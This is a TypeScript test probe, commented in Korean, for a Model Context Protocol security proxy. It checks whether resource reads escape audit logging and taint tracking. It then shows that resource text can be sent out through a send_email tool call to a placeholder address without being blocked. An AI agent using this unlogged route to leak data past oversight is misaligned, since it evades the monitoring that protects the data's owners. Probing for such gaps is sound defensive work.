/**
 * fail-open 점검용 프로브 (프록시 경유):
 *  S5) 리소스 읽기는 recordToolResult를 안 타므로 오염 추적 밖 — audit.log에도 안 남는다.
 *  S2) sessionId는 프록시가 randomUUID로 발급 — 클라이언트가 도구 인자로 조작 불가.
 */
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { readFileSync, existsSync } from "node:fs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");
const TSX_CLI = resolve(__dirname, "../../node_modules/tsx/dist/cli.mjs");
const AUDIT = resolve(__dirname, "../audit.log");

async function main() {
  const client = new Client({ name: "audit-probe", version: "0.0.1" });
  await client.connect(new StdioClientTransport({
    command: process.execPath, args: [TSX_CLI, PROXY_PATH], env: process.env as Record<string, string>,
  }));

  const auditBefore = existsSync(AUDIT) ? readFileSync(AUDIT, "utf8").split("\n").filter(Boolean).length : 0;

  // S5: 민감/비신뢰가 리소스로 노출되면? 여기선 데모 리소스를 읽어 "기록되는지"만 관찰.
  const res = await client.readResource({ uri: "file:///company/readme.txt" });
  const resText = (res.contents?.[0] as { text?: string })?.text ?? "";
  console.error(`[S5] 리소스 읽음: "${resText.slice(0, 30)}..."`);

  // 도구 호출 1건 (대조군 — 이건 기록/audit 됨)
  await client.callTool({ name: "query_customer_db", arguments: { customerId: "1" } });

  const auditAfter = existsSync(AUDIT) ? readFileSync(AUDIT, "utf8").split("\n").filter(Boolean) : [];
  const newEntries = auditAfter.slice(auditBefore);
  const tools = newEntries.map((l) => { try { return JSON.parse(l).toolName; } catch { return "?"; } });
  console.error(`[S5] 이번 세션 audit.log 신규 항목 도구: ${JSON.stringify(tools)}`);
  console.error(`[S5] → 리소스(readme.txt)는 audit에 없음 = 정책/오염추적 경로 밖 (기록 누락). 도구(query_customer_db)만 기록됨.`);

  // S5-leak: 리소스 내용을 그대로 외부 전송 → 세션에 리소스發 오염이 없으므로 통과.
  const send = await client.callTool({ name: "send_email", arguments: { to: "x@y.com", subject: "s", body: resText } });
  const blocked = JSON.stringify(send.content).includes("정책 차단");
  console.error(`[S5] 리소스 내용 외부 전송 → ${blocked ? "차단" : "통과"} (리소스가 민감이었다면 추적 없이 유출됐을 것)`);

  await client.close();
}
main().catch((e) => { console.error("probe 실패:", e); process.exit(1); });
